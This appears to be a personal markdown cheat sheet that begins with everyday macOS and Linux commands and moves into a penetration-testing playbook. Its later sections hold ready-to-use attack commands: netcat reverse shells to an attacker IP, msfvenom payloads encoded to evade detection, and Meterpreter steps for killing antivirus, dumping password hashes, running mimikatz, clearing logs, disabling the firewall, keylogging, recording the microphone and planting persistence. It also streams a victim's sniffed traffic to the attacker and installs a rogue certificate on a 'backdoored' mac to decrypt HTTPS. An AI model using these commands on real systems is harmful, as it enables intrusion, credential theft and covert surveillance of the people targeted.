# MacOS command line

https://explainshell.com/

```bash
sudo !! (repeat last command like root)

clear (clear screen)
CTRL + L (clear screen)

pwd (actual route)

ls -1 (one column)

ls -all
ls -all > file.txt (record outpout on file)
ls -all | grep filter* (filter)

touch file.txt (create file)

cat file.txt (read content)

rm file.txt (remove file)

mkdir directory (create directory)
rm -R directory (remove directory)

history | grep something

cp file.txt file2txt (copy)
mv file.txt file2txt (move)

more 

ps (servicios)
ps -all
ps -ax

kill UID (kill process)
kill -9 UID (force kill process)
killall Finder (kill app)

top (activity monitor)

locate finder (search)
locate updatedb

whereis dash (search bin)

service (list services)
service servicename start | status | stop

sudo crontab -u nicolasgrimonpont -l (check cron tasks)
crontab -l (check cron tasks for this user)
```

## Low privileges actions

```bash
osascript -e 'set volume 7' (modify volume to maximum, 0 for minimum)

open https://www..... (open a link)

open -a ApplicationName (launches an app)
open -a ApplicationName --hide (launches an app hidden)
open Downloads/Instructions.doc -a TextEdit (open a file in one application)
```

### Computer talk

```bash
say hello -v diego

spanish: diego, Jorge, Monica
mexican: Juan, Paulina
french: Thomas, Amelie
```

### ARP tables

The arp command can be used to print the macOS device's ARP table and discover devices on the network without performing a single Nmap scan. (passive)

```bash
arp -i en0 -l -a
```

The -i argument is used to specifies the Wi-Fi interface while -l prints the output data in a more human-readable format. To print all of the ARP table entries, use the -a argument.
	

### Check PORT used

```bash
lsof -i -P -n
lsof -i -P -n | grep LISTEN
```

### System information

```bash
date
cal
uptime (show time from starting)
w (list users)
whoami (this user)
finger username (info about user)
uname -a (sysinfo)
cat /proc/cpuinfo (processor)
cat /proc/meminfo (memory)
free (check memory)
df (check disk)
```

### Network interface

```bash
networksetup -listallhardwareports (list)
networksetup -setairportpower en0 on (on/off)
networksetup -setairportnetwork en0 SSID PASSPHRASE (connect to network)
networksetup -removepreferredwirelessnetwork en0 SSID (remove a profile)
networksetup -removeallpreferredwirelessnetworks en0 (remove all profile)
```

### System profiler

```bash
system_profiler --help
```

This command without arguments take lot of memory and time.

Use this command to list all data types:

```bash
system_profiler -listDataTypes
```

Then just execute the commands you need, here an example with two different command in one time:

```bash
system_profiler SPSoftwareDataType SPNetworkDataType
```

### Sleep function

Computer don't sleep when activated:

```bash
caffeinate &
```

Add an ampersand (&) to the end of the argument so that the command runs in the background. Using & allows us to continue to use the terminal while the caffeinate command runs in the background.

To prevent the display from sleeping, use caffeinate -d. To prevent the system from idle sleeping, use caffeinate -i. If you want to prevent the disk from going idle then you want to use the “caffeinate -m” command.

Finally, and this one is particularly useful for laptop users, if you want keep your system awake while it is plugged into AC power, use caffeinate -s.



## High privileges actions

```bash
sudo purge (purge RAM)
```

### Sharing preferences

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist (enable ssh)
sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist (disable ssh)
```

### Start apache

```bash
sudo apachectl (start|status|restart|stop)
```

Web folder:

```bash
/Library/WebServer/Documents/
```

### Remove DNS cache

	dscacheutil -flushcache
	sudo killall -HUP mDNSResponder

### Connect through SSH

	ssh nicolasgrimonpont@192.168.0.116 (need password)



## Customize Terminal

	nano bash_profile

Copy that lines to customize prompt and add colors:

	source ~/.profile
	export PS1="\[\033[36m\]\u\[\033[m\]:\[\033[33;1m\]\w\[\033[m\]\$ "
	export CLICOLOR=1
	export LSCOLORS=ExFxBxDxCxegedabagacad



## Homebrew

List all the installed formulae.

```
brew list
```

Display all locally available formulae for brewing.

```
brew search
```

Perform a substring search of formulae names for brewing.

```
brew search <text>
```

Display information about the formula.

```
brew info <formula>
```

Install the formula.

```
brew install <formula>
```

Uninstall the formula.

```
brew uninstall <formula>
```

### Brew cask

Add the Cask repository from Github.

```
brew tap homebrew/cask
```

List all the installed casks .

	brew cask list

Search all known casks based on the substring text.

	brew search <text>

Install the given cask.

	brew cask install <cask>

Reinstalls the given Cask

	brew cask reinstall <cask>

Uninstall the given cask.

	brew cask uninstall <cask>

### Clean up

Remove older versions of installed formulae.

	brew cleanup

Remove older versions of specified formula.

	brew cleanup <formula>

Display all formula that will be removed (dry run)

	brew cleanup -n



## Index of command line

https://ss64.com/osx/

| Command                | Description                                                  |
| ---------------------- | ------------------------------------------------------------ |
| afconvert              | Audio File Convert                                           |
| afinfo                 | Audio File Info                                              |
| afplay                 | Audio File Play                                              |
| airport                | Manage Apple AirPort                                         |
| alias                  | Create an alias •                                            |
| alloc                  | List used and free memory                                    |
| apropos                | Search the whatis database for strings                       |
| asr                    | Apple Software Restore                                       |
| atsutil                | Font registration system utility                             |
| awk                    | Find and Replace text within file(s)                         |
| basename               | Convert a full pathname to just a filename                   |
| bash                   | Bourne-Again SHell                                           |
| bc                     | Arbitrary precision calculator language                      |
| bg                     | Send to background •                                         |
| bind                   | Set or display readline key and function bindings •          |
| bless                  | Set volume bootability and startup disk options              |
| break                  | Exit from a For, While, Until or Select loop •               |
| builtin                | Execute a shell builtin •                                    |
| bzip2                  | Compress or decompress files                                 |
| caffeinate             | Prevent the system from sleeping                             |
| cal                    | Display a calendar                                           |
| calendar               | Reminder Service                                             |
| caller                 | Return the context of a subroutine call •                    |
| cancel                 | Cancel print jobs                                            |
| case                   | Conditionally perform a command •                            |
| cat                    | Concatenate and print (display) the content of files         |
| cd                     | Change Directory •                                           |
| chflags                | Change a file or folder's flags                              |
| chgrp                  | Change group ownership                                       |
| chmod                  | Change access permissions                                    |
| chown                  | Change file owner and group                                  |
| chroot                 | Run a command with a different root directory                |
| cksum                  | Print CRC checksum and byte counts                           |
| clear                  | Clear terminal screen                                        |
| cmp                    | Compare two files                                            |
| comm                   | Compare two sorted files line by line                        |
| command                | Run a command (not a function) •                             |
| complete               | Edit a command completion [word/pattern/list] •              |
| continue               | Resume the next iteration of a loop •                        |
| cp                     | Copy one or more files to another location                   |
| cpio                   | Copy files to and from archives                              |
| cron                   | Daemon to execute scheduled commands                         |
| crontab                | Schedule a command to run at a later date/time               |
| csplit                 | Split a file into context-determined pieces                  |
| csrutil                | Configure System Integrity Protection (SIP)                  |
| cupsfilter             | Convert a file to another format using cups filters          |
| curl                   | Transfer data  from or to a server                           |
| cut                    | Divide a file into several parts                             |
| date                   | Display or change the date & time                            |
| dc                     | Desk Calculator                                              |
| dd                     | Data Duplicator - convert and copy a file, clone disks       |
| declare                | Declare variable & set attributes •                          |
| defaults               | Set preferences, show hidden files                           |
| df                     | Display free disk space                                      |
| diff                   | Display the differences between two files                    |
| diff3                  | Show differences among three files                           |
| dig                    | DNS lookup                                                   |
| dirname                | Convert a full pathname to just a path                       |
| dirs                   | Display list of remembered directories •                     |
| diskutil               | Disk utilities - Format, Verify, Repair                      |
| disown                 | Unbind a job from the current login session •                |
| ditto                  | Copy files and folders                                       |
| dot_clean              | Remove dot-underscore files                                  |
| drutil                 | Interact with CD/DVD burners                                 |
| dscacheutil            | Query or flush the Directory Service/DNS cache               |
| dseditgroup            | Edit, create, manipulate, or delete groups                   |
| dsenableroot           | Enable root access                                           |
| dsmemberutil           | View user and groups rights                                  |
| dscl                   | Directory Service command line utility                       |
| du                     | Estimate file space usage                                    |
| echo                   | Display text on screen •                                     |
| ed                     | A line-oriented text editor (edlin)                          |
| enable                 | Enable and disable builtin shell commands •                  |
| env                    | List or Set environment variables                            |
| eval                   | Evaluate several commands/arguments •                        |
| exec                   | Execute a command •                                          |
| exit                   | Exit the shell •                                             |
| execsnoop              | Snoop new process execution                                  |
| expand                 | Convert tabs to spaces                                       |
| expect                 | Programmed dialogue with interactive programs                |
| export                 | Set an environment variable •                                |
| expr                   | Evaluate expressions                                         |
| false                  | Do nothing, unsuccessfully                                   |
| fc                     | Fix command (history)                                        |
| fdisk                  | Partition table manipulator for Darwin UFS/HFS/DOS           |
| fdesetup               | FileVault configuration, list FileVault users                |
| fg                     | Send job to foreground •                                     |
| file                   | Determine file type                                          |
| find                   | Search for files that meet a desired criteria                |
| fmt                    | Reformat paragraph text                                      |
| fold                   | Wrap text to fit a specified width                           |
| for                    | Loop command •                                               |
| fsck                   | Filesystem consistency check and repair                      |
| fs_usage               | Filesystem usage (process/pathname)                          |
| ftp                    | Internet file transfer program                               |
| function               | Define Function Macros                                       |
| fuser                  | List processes that have one or more files open              |
| GetFileInfo            | Get attributes of HFS+ files                                 |
| getopt                 | Parse positional parameters                                  |
| getopts                | Parse positional parameters •                                |
| goto                   | Jump to label and continue execution                         |
| grep                   | Search file(s) for lines that match a given pattern          |
| groups                 | Print group names a user is in                               |
| gzip                   | Compress or decompress files                                 |
| halt                   | Stop and restart the operating system                        |
| hash                   | Refresh the cached/remembered location of commands •         |
| head                   | Display the first lines of a file                            |
| hdiutil                | Manipulate iso disk images                                   |
| history                | Command History •                                            |
| hostname               | Print or set system name                                     |
| iconv                  | Convert the character set of a file                          |
| id                     | Print user and group names/id's                              |
| if                     | Conditionally perform a command •                            |
| ifconfig               | Configure network interface parameters                       |
| iostat                 | Report CPU and i/o statistics                                |
| ipconfig               | View and control IP configuration state                      |
| info                   | Help info                                                    |
| install                | Copy files and set attributes                                |
| iosnoop                | Snoop I/O events as they occur                               |
| jobs                   | List active jobs •                                           |
| join                   | Join lines on a common field                                 |
| kextfind               | List kernel extensions                                       |
| kextstat               | Display status of loaded kernel extensions (kexts)           |
| kextunload             | Terminate driver instances and unload kernel extensions.     |
| kickstart              | Configure Apple Remote Desktop                               |
| kill                   | Kill a process by specifying its PID                         |
| killall                | Kill processes by name                                       |
| l                      | List files in long format (ls -l)                            |
| last                   | Indicate last logins of users and ttys                       |
| launchctl              | Load or unload daemons/agents                                |
| ll                     | List files in long format, showing invisible files (ls -la)  |
| less                   | Display output one screen at a time                          |
| let                    | Evaluate expression •                                        |
| lipo                   | Convert a universal binary                                   |
| ln                     | Make links between files (hard links, symbolic links)        |
| local                  | Set a local (function) variable •                            |
| locate                 | Find files                                                   |
| logname                | Print current login name                                     |
| login                  | log into the computer                                        |
| logout                 | Exit a login shell (bye) •                                   |
| look                   | Display lines beginning with a given string                  |
| lp                     | Print files                                                  |
| lpr                    | Print files                                                  |
| lprm                   | Remove jobs from the print queue                             |
| lpstat                 | Printer status information                                   |
| ls                     | List information about file(s)                               |
| lsregister             | Reset the Launch Services database                           |
| lsbom                  | List a bill of materials file                                |
| lsof                   | List open files                                              |
| man                    | Help manual                                                  |
| mdfind                 | Spotlight search                                             |
| mdls                   | List the metadata attributes for a specified file            |
| mdutil                 | Manage Spotlight metadata store                              |
| mkdir                  | Create new folder(s)                                         |
| mkfifo                 | Make FIFOs (named pipes)                                     |
| mkfile                 | Make a file                                                  |
| mktemp                 | Make a temporary file                                        |
| more                   | Display output one screen at a time                          |
| mount                  | Mount a file system                                          |
| mv                     | Move or rename files or directories                          |
| nano                   | Simple text editor                                           |
| nc/netcat              | Read and write data across networks                          |
| net                    | Manage network resources                                     |
| netstat                | Show network status                                          |
| networksetup           | Network and System Preferences                               |
| nice                   | Set the priority of a command                                |
| nohup                  | Run a command immune to hangups                              |
| ntfs.util              | NTFS file system utility                                     |
| nvram                  | Manipulate  firmware variables                               |
| onintr                 | Control the action of a shell interrupt                      |
| open                   | Open a file/folder/URL/Application                           |
| opensnoop              | Snoop file opens as they occur                               |
| openssl                | OpenSSL command line                                         |
| osacompile             | Compile Applescript                                          |
| osascript              | Execute AppleScript                                          |
| passwd                 | Modify a user password                                       |
| paste                  | Merge lines of files                                         |
| pbcopy                 | Copy data to the clipboard                                   |
| pbpaste                | Paste data from the Clipboard                                |
| pgrep                  | List processes by a full or partial name                     |
| ping                   | Test a network connection                                    |
| pkill                  | Kill processes by a full or partial name                     |
| pkgbuild               | Build a macOS Installer component package                    |
| pkgutil                | Query and manipulate installed packages                      |
| plutil                 | Property list utility                                        |
| pmset                  | Power Management settings                                    |
| popd                   | Restore the previous value of the current directory •        |
| pr                     | Convert text files for printing                              |
| printenv               | List environment variables                                   |
| printf                 | Format and print data •                                      |
| ps                     | Process status                                               |
| pushd                  | Save and then change the current directory                   |
| pwd                    | Print Working Directory •                                    |
| quota                  | Display disk usage and limits                                |
| rcp                    | Copy files between machines                                  |
| read                   | Read one line from standard input •                          |
| readonly               | Mark a variable or function as read-only •                   |
| reboot                 | Stop and restart the system                                  |
| ReportCrash            | Enable/Disable crash reporting                               |
| return                 | Exit a function •                                            |
| rev                    | Reverse lines of a file                                      |
| rm                     | Remove files                                                 |
| rmdir                  | Remove folder(s)                                             |
| rpm                    | Remote Package Manager                                       |
| rsync                  | Remote file copy - Sync file tree                            |
| say                    | Convert text to audible speech                               |
| screen                 | Multiplex terminal, run remote shells via ssh                |
| screencapture          | Capture screen image to file or disk                         |
| scselect               | Switch between network locations                             |
| scutil                 | Manage system configuration parameters                       |
| sdiff                  | Merge two files interactively                                |
| security               | Administer Keychains, keys, certificates and the Security framework |
| sed                    | Stream Editor                                                |
| select                 | Generate a list of items •                                   |
| serverinfo             | Server information                                           |
| set                    | Set a shell variable = value •                               |
| setfile                | Set attributes of HFS+ files                                 |
| sharing                | Create share points for afp, ftp and smb services            |
| shasum                 | Print or Check SHA Checksums                                 |
| shift                  | Shift positional parameters •                                |
| shopt                  | Set shell options •                                          |
| shutdown               | Shutdown or restart macOS                                    |
| sips                   | Scriptable image processing system                           |
| sleep                  | Delay for a specified time                                   |
| softwareupdate         | System software update tool                                  |
| sort                   | Sort text files                                              |
| source                 | Execute commands from a file •                               |
| spctl                  | Security assessment policy/Gatekeeper                        |
| split                  | Split a file into fixed-size pieces                          |
| sqlite3                | SQL database (download history)                              |
| srm                    | Securely remove files or directories                         |
| stat                   | Display the status of a file                                 |
| stop                   | Stop a job or process                                        |
| su                     | Substitute user identity                                     |
| sudo                   | Execute a command as another user                            |
| sum                    | Print a checksum for a file                                  |
| suspend                | Suspend execution of this shell •                            |
| sw_vers                | Print macOS operating system version                         |
| sysctl                 | Get or set kernel state                                      |
| system_profiler        | Report system configuration                                  |
| systemsetup            | Computer and display system settings                         |
| tail                   | Output the last part of files                                |
| tar                    | Tape ARchiver                                                |
| tccutil                | Manage the privacy database                                  |
| tcpdump                | Dump traffic on a network                                    |
| tee                    | Redirect output to multiple files                            |
| test                   | Condition evaluation •                                       |
| textutil               | Manipulate text files in various formats (Doc,html,rtf)      |
| time                   | Measure Program Resource Use                                 |
| times                  | Print shell & shell process times •                          |
| tmutil                 | Time Machine utility                                         |
| top                    | Display process information                                  |
| touch                  | Change file timestamps                                       |
| tput                   | Set terminal-dependent capabilities, color, position         |
| tr                     | Translate, squeeze, and/or delete characters                 |
| trap                   | Execute a command when the shell receives a signal •         |
| traceroute             | Trace Route to Host                                          |
| trimforce              | Enable TRIM commands on third-party drives                   |
| true                   | Do nothing, successfully                                     |
| tty                    | Print filename of terminal on stdin                          |
| type                   | Describe a command •                                         |
| ufs.util               | Mount/unmount UFS file system                                |
| ulimit                 | limit the use of system-wide resources •                     |
| umask                  | Users file creation mask                                     |
| umount                 | Unmount a device                                             |
| unalias                | Remove an alias •                                            |
| uname                  | Print the Darwin OS Kernel version / release / machine name  |
| unexpand               | Convert spaces to tabs                                       |
| uniq                   | Uniquify files                                               |
| units                  | Convert units from one scale to another                      |
| unset                  | Remove variable or function names •                          |
| until                  | Loop command •                                               |
| uptime                 | Show how long system has been running                        |
| users                  | Print login names of users currently logged in               |
| until                  | Execute commands (until error)                               |
| uuencode               | Encode a binary file                                         |
| uudecode               | Decode a file created by uuencode                            |
| uuidgen                | Generate a Unique ID (UUID/GUID)                             |
| uucp                   | Unix to Unix copy                                            |
| vi                     | Text Editor                                                  |
| w                      | Show who is logged on and what they are doing                |
| wait                   | Wait for a process to complete •                             |
| wall                   | Write a message to users                                     |
| wc                     | Print byte, word, and line counts                            |
| whatis                 | Search the whatis database for complete words                |
| whereis                | Locate a program                                             |
| which                  | Locate a program file in the user's path                     |
| while                  | Loop command •                                               |
| who                    | Print all usernames currently logged on                      |
| whoami                 | Print the current user id and name (`id -un')                |
| write                  | Send a message to another user                               |
| xargs                  | Execute utility - passing arguments                          |
| xattr                  | Display and manipulate extended attributes                   |
| xcode-select --install | Install the command line developer tools                     |
| youtube-dl             | Download video                                               |
| yes                    | Print a string until interrupted                             |
| zip                    | Package and compress (archive) files.                        |
| !!                     | Run the last command again                                   |



# Linux command line

http://dmvillan.com/kali-linux-commands-list/

	ifconfig & iwconfig

## Restart WIFI Adaptater

	service network-manager restart

## Check partition

	df -h

## Active web server

	service apache2 start 

## Linux updates

To begin the update of your Kali Linux system first update the packages index list. Open up terminal and enter:

	sudo apt update -y
	sudo apt-get update -y

Next, optionally, display all packages which are scheduled for update:

	sudo apt list --upgradable

At this stage we have an option to upgrade individual packages using apt install PACKAGE-NAME or upgrade all packages at once:

```bash
sudo apt-get upgrade -y
```

Due to package dependency changes some of the Kali Linux packages might be kept back. 

If this is this case you will be notified by the apt upgrade Linux command at the end of the Kali Linux upgrade process. You may upgrade each kept back package individually using the apt install PACKAGE-NAME command or update all kept back packages at once:

```bash
sudo apt dist-upgrade -y
sudo apt-get dist-upgrade -y
```

During your initial system upgrade some of the packages may become obsolete, hence are no longer required. To remove all no longer required Kali Linux packages execute:

```bash
sudo apt-get autoremove
```

## Kali Installation

Search for kali packages:

```bash
apt-get update && apt-cache search kali-linux
```

Install kali packages:

```bash
sudo apt update && sudo apt install kali-linux-all
```

## Install Parirus Theme

```bash
sudo add-apt-repository ppa:papirus/papirus
sudo apt-get update
sudo apt-get install papirus-icon-theme
```

## List all application

```bash
dpkg -l
apt list
```

## Install Vmware tools

```bash
sudo apt update && sudo apt full-upgrade -y
[ -f /var/run/reboot-required ] && sudo reboot -f

sudo apt install -y --reinstall open-vm-tools-desktop fuse
sudo reboot

ln -sf /usr/local/sbin/mount-shared-folders ~/Desktop/mount-shared-folders
gsettings set org.gnome.nautilus.preferences executable-text-activation 'ask'
```

## Install Softwares

```bash
sudo apt-get install git (install git)
```

## Create alias

```bash
nano /root/.bash_aliases
```

## Update system automaticaly

```bash
function apt-updater {
	apt-get update &&
	apt-get dist-upgrade -Vy &&
	apt-get autoremove -y &&
	apt-get autoclean &&
	apt-get clean &&
	reboot
}
```

## Install WIFI driver

```bash
sudo apt update
sudo apt install realtek-rtl88xxau-dkms
```

# Analisys

## Nessus

download & activation:

https://es-la.tenable.com/products/nessus/nessus-professional

install:

	cd downloads
	dpkg -i Nessus-VERSION.deb

## Recon-ng

	marketplace install all (install all modules)
	
	modules search (search for modules)
	
	workspace add myworkspace (create workspace)
	add domains website.com (add domain)
	show domains

Methode 1:

	use discovery/info_disclosure/cache_snoop
	show info
	set ...
	run

Methode 2:

	modules load discovery/info_disclosure/cache_snoop
	options list / info
	options set NAMESERVER 162.159.24.80
	run
	
	back
	
	modules load discovery/info_disclosure/interesting_files
	options list / info
	options set PORT 443 (for https / 80 http)
	options set PROTOCOL https
	options set SOURCE www.website.com
	run

## Others

	snmp-check 10.1.1.12 -w

## Openvas

	sudo openvasmd --get-users (get users)
	sudo openvasmd --user=admin --new-password=sup3rs3cr3t (change password)

## Metasploit

## Armitage

	systemctl start postgresql (start the PostgreSQL Database)
	msfdb init (initialize metasploit database or see metasploit instruction)

# Enumeration

## Enumeration (pasive)

Whois:

Get domains, ip ranges

http://whois.domaintools.com/
http://robtex.com/

Autonom systems:

Get autonom systems, ip ranges and domains (not subdomains)

https://bgp.he.net/
http://ipv4info.com/

Get subdomains informations:

Get subdomains

https://dnsdumpster.com/

Google:

	site:website.com -site:www.site.com
	site:.com
	related:lemonde.fr
	intitle: "Index of /" site:www.website.com
	allintitle: "Index of /" site:www.website.com
	inurl:"admin.php"
	allinurl:"admin.php"
	intext:"admin" intext:"password"
	allintext:"admin" intext:"password"
	filetype:xls
	ext:xls
	
	site:website && intext:test
	site:website OR intext:@gmail.com

https://www.exploit-db.com/google-hacking-database

Bing:

	ip:192.93.13.54
	location:fr

Harvester:

Get emails info and domains

	theHarvester -d website.com -l 500 -b all

Archive:

Watch first website versions

https://archive.org/

Search vulerabilities, credentials, testing features.

Online Passive Scans:

https://www.shodan.io/

	apache
	net:140.43.34.54/16
	title:title
	port:
	org:"Universidad.."
	hostname:website.com

https://www.zoomeye.org/
https://censys.io/ipv4

## Enumeration (active)

### Sniffing

Wireshark:

	!(ip.addr == 10.0.0.12)
	Statistics => Conversations =>IPv4

### Scan

Arp scan:

	arp-scan 10.1.1.0/24

Nmap:

	nmap -sn 10.1.1.12 (default - ping)
	nmap -Pn 10.1.1.12 (no ping - service scan)
	nmap -sP 10.1.1.12/24 (ping icmp - no service - system on (bypass ping filtering))
	
	nmap -sT 10.1.1.12/24 (service TCP - 1000 ports)
	nmap -sU 10.1.1.12/24 (service UDP- 1000 ports - slower than TCP)
	
	nmap -sT -p 80,8080 10.1.1.12/24 (services TCP on ports)
	nmap -sT -p- 10.1.1.12/24 (services TCP all ports)
	nmap -sT 10.1.1.12/24 -n (services TCP - no resolution DNS (no detection))
	nmap -sT -Pn10.1.1.12/24 -n --open (open's services TCP - no resolution DNS (no detection))
	
	nmap -sT 10.1.1.12/24 -n --open -n -Pn -O (open's services TCP - no resolution DNS (no detection) - no ping - OS)
	nmap -sT 10.1.1.12/24 -n --open -n -Pn -sV (open's services TCP - no resolution DNS (no detection) - no ping - versions)
	nmap -sT 10.1.1.12/24 -n --open -n -Pn -sC (open's services TCP - no resolution DNS (no detection) - no ping - scripts)
	nmap -sT 10.1.1.12/24 -n --open -n -Pn -A (open's services TCP - no resolution DNS (no detection) - no ping - OS, versions, scripts, traceroute)

Netcat:

installed on all unix by default (macos, linux), default shell command lines.

	nc -z -v 10.1.1.12 -n
	nc -zvn 10.1.1.12 100-500

### DNS

Manual DNS enumeration:

	dig website.com (get type A)
	dig mx website.com (get type MX)
	dig ns website.com (get type NS)
	
	host -t axfr website.com
	dig axfr @SERVER-DNS website.com (DNS zone attack)

Auto DNS enumeration:

	dnsenum website.com
	dnsenum -enum website.com
	
	dnsmap website.com (dictionary DNS resolution)
	
	fierce -dns website.com (dictionary DNS resolution - bigger)

### Metasploit

Scan:

import to metasploit:

	nmap -A 10.1.1.12 -oA basename (output file)
	db_import /root/basename.xml

or run from metasploit:

	db_nmap -A 10.1.1.12 (use nmap command)
	
	hosts (show results)
	hosts -c address,os_name (filter view)
	
	services (show services)
	services -c name,info 10.1.1.12 (filter view)
	services -c name,info -S http (filter view, search services)
	services -c name,info -p 4545 (filter view, search ports)

# Exploitation

## Netcat

Installed on all unix by default (macos, linux), default shell command lines.
Can be used like payload and execute a shell in last versions. (on MacOs, can't execute -e directly)

direct connection: when attacker connect and victim listen
reverse connection: when attacker listen and victim connect (not detected by firewalls - antivirus)

Kali:

	nc MACOS/Windows-IP 8888  -e /bin/bash (connect)
	nc  -lvvp 8888 -e /bin/bash (listen)

MacOS:

	nc KALI-IP 8888 (connect - cannot execute -e directly)
	nc -l 8888 (listen - cannot execute -e directly)

Windows:

	nc KALI-IP 8888 -e cmd.exe (connect)
	nc  -lvvp 8888 -e cmd.exe (listen)

## Metasploit

sudo msfdb init && msfconsole

Exploits:

	search exploit/osx
	
	use exploit/osx/...
	show info
	
	options
	set options value
	
	set payload [TAB] (payload compatible with exploit)
	set payload osx/meterpreter/reverse_tcp
	options
	show info (payload max space, rank)
	
	exploit (run exploit & active payload)
	
	use exploit/windows/smb/ms08_067_netapi (smb exploit)
	
	use exploit/multi/handler (listener)

### Payloads

Add user:

	set payload windows/adduser
	options
	show target (if don't autodetect)
	set target ...

### Meterpreter

	set payload windows/meterpreter/bind_tcp (direct connection)
	set payload windows/meterpreter/reverse_tcp (reverse connection (bypass firewall))
	set payload windows/meterpreter/reverse_http (reverse connection - tunelize on http port)

### VncInject

	set payload windows/vncinject/reverse_tcp (reverse connection -  remote access (visible on target screen))

### Shell

	set payload windows/shell/reverse_tcp (reverse connection - light payload - shell (used to execute meterpreter))
	send shell on background

### Auxilary

https://www.offensive-security.com/metasploit-unleashed/auxiliary-module-reference/

```bash
use auxilary/scanner/discovery/arp_sweep (scanner ARP)
show_info
set rhosts 10.1.1.0/24
run

use auxilary/scanner/smb/pipe_auditor (check if smb is active to run exploit like netapi)
```

### Add modules to metasploit

Terminal:

```bash
mkdir /usr/share/metasploit-framework/modules/exploits/custom/
cd /usr/share/metasploit-framework/modules/exploits/custom/
wget https://gist.githubusercontent.com/todb-r7/5935519/raw/f18d6b0dcd94d135a567e5b50a9b1cab3a1c5e1b/test_module.rb  (module used for test => https://gist.github.com/todb-r7/5935519)

can add new modules in each directories (exploits/custom, aucilary/custom, etc.) (custom modules have to be in ruby, .rb)
```

Metasploit:

	reload_all (on metasploit console to load new exploit or restart metasploit)
	use exploit/custom/test_module

### External Tools

#### Msfvenom

Payload generation:

	msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=10.1.1.12 lport=4545 -e x86/shikata_ga_nai -b '\x00' -i 3 -f exe -o test.exe
	
	-a: x86/x64
	--platform: platform
	-p: payload
	-lhost: kali ip
	-lport: port
	-e: encoder
	-b: bad caracter to encode

##### Metasploit

	use exploit/multi/handler (listener)
	set payload windows/meterpreter/reverse_tcp
	set lhost 10.1.1.12
	set lport 4545 
	run

#### Armitage

GUI client for Metasploit, automated tools. (not complete like real metasploit)

Can be used for scaning (auxilary modules, nmap, etc...), detect OS and find vulnerabilities for this system, but is better to run the exploits from metasploit command lines.

	Attacks => Find attacks (find vulnerabilities for this system)
	Attacks => Hail Mary  (autopwn - run all compatible exploits - very agressive - should not be used)

# Post exploitation

## Meterpreter

	help
	help -l (show librairies - used to increment features)

### Informations

	sysinfo (system details)
	getpid (pid of process used by meterpreter)
	ps (show process)
	getuid (show system and user)
	
	migrate pid (migrate process to explorer.exe)

### Scripts

	run checkvm (check if is virtual machine)
	run get_env (environment details)
	run get_applications_list (app list & versions)
	
	run scraper (run lot of scripts and save all on files) (use registry - danger for antivirus)
	cd /root/.msf4/logs/scripts/scraper/...
	
	run winenum (run lot of scripts and save all on files) (don't use registry - less danger for antivirus)
	
	run killav (check if antivirus from list of 50 and desactivate it)

### Elevate privileges

	getsystem

if already have system privilege, can migrate to another process with user privilege and get system privilege easily for this process.

	rev2self (comeback to anterior privileges)

### Passwords

	hashdump (get credentials hash of all users - need system privilege)

### Librairies

	use -l
	
	use mimikatz (search password on system memory)
	help
	wdigest (get list of passwords on memory)
	
	use kiwi (search password on system memory - modern version)
	help
	creds_all

### Remove trace

	clearrev (clear logs - system privileges)

### Desactivate firewall

	shell (system privileges)
	netsh firewall show opmode (on windows shell - check status of firewall)
	netsh firewall set opmode mode = disable profile = all (on windows shell - check status of firewall)
	exit

### Keyloger

	keyscan_start (need to be user who want to spy)
	keyscan_dump (results)
	keyscan_stop
	screenshot
	run vnc (remote access)
	record_mic 10 (record 10s)

### Sniffer

Network sniffer.

Librairies:

	use -l
	
	use sniffer
	sniffer_interfaces (show interfaces)
	sniffer_start 1 1024 (interface & buffer (when buffer is full the datas we'll be send))
	sniffer_stats 1 (status)
	sniffer_dump 1 file.pcap (send results to file)
	wireshark file.pcap (open file)
	sniffer_stop 1

### Backdoor

Easy backdoor implementation.

	run persistence -h (execute payload - program task)
	run persistence (configuration recommanded)
	
	run persistence -A -L C:\\temp\\ -x -i 15 -p 443 -r 10.1.1.12
	
	: Automatically start
	: localisation
	: Automatically start on boot
	: time in second to try connect to listener (recommanded to use bigger number)
	: port
	: Kali IP

keep information returning by the console to analyse - contain link to script (.rc) to remove persitence
	
resource URL (use link returning by console)

## Netcat & TCPDump

### Data in file

Sniff traffic from a mac with netcat (default on macos) and use tcpdump (default on macos) to send the traffic to Kali then use wireshark to analyse that traffic:

	- nc -l -p 7777 | tee /tmp/sniffed_output.pcap (on kali, without -p for mac)
	- /usr/sbin/tcpdump -w - | nc KALI_IP 7777 (on mac)

### Data in real time

On kali:

	- mkfifo /tmp/wiretap
	- nc -l -p 9999 > /tmp/wiretap
	- wireshark -k -i /tmp/wiretap

On mac:

	- /usr/sbin/tcpdump -i <interface> -w - | nc 1.2.3.4 9999

## Sniffing https traffic (BURP)

Download BURP Pro and execute file (optional):

	- sudo bash /path/to/file

Open and configure proxy on burpsuite (port and ip).

On backdoored mac:

	- curl -s --insecure --proxy http://192.168.0.110:8080 http://burp/cert -o /tmp/burp.der (download certificate)

In the above command, curl will silently (-s) download the certificate from our Kali machine. The --proxy argument is required because we're instructing curl to use the newly configured Burp listener to fetch the certificate; This certificate isn't trusted by curl (or any web browser) by default, so the --insecure argument is required to ignore warnings in the output. Finally, the Burp certificate is saved (-o) to the /tmp directory with the file name burp.der. The .der file extension is merely the certificate's default file format and shouldn't be changed.

	- security add-trusted-cert -k /Library/Keychains/System.keychain -d /tmp/burp.der (add certificate to mac keychain)

Security will add (add-trusted-cert) and fully trust the certificate (-d /tmp/burp.der) into the macOS primary system Keychain (-k). All we have to do now is configure macOS to send us all of the target's web traffic.

List network services (optional):

	- /usr/sbin/networksetup -listallnetworkservices
	- /usr/sbin/networksetup -getwebproxy "Wi-Fi"
	- /usr/sbin/networksetup -getsecurewebproxy "Wi-Fi"

Active the certicate for http and https requests:

	- /usr/sbin/networksetup -setwebproxy "Wi-fi" 192.168.0.110 8080
	- /usr/sbin/networksetup -setsecurewebproxy "Wi-fi" 192.168.0.110 8080

Then in Burp, in HTTP history, all the traffic appear in clear.

We can send the encoded URL parameters in encoders, choose URL format, to decode parameters if necessary.

PortSwigger CA certificate are certificate created from Burp, can search it on keychain. Also can verify proxy configuration on system preference, network, on mac.

Keep connection open:

Use caffeinate to force keep the connection open:

	- caffeinate &

Desactive the certificate for http and https:

	- /usr/sbin/networksetup -setwebproxystate "Wi-fi" off
	- /usr/sbin/networksetup -setsecurewebproxystate "Wi-fi" off

Can use a VPS to use this technic if we are not in the same network.

# Wifi network

## 

# Security tools

## Aircrack

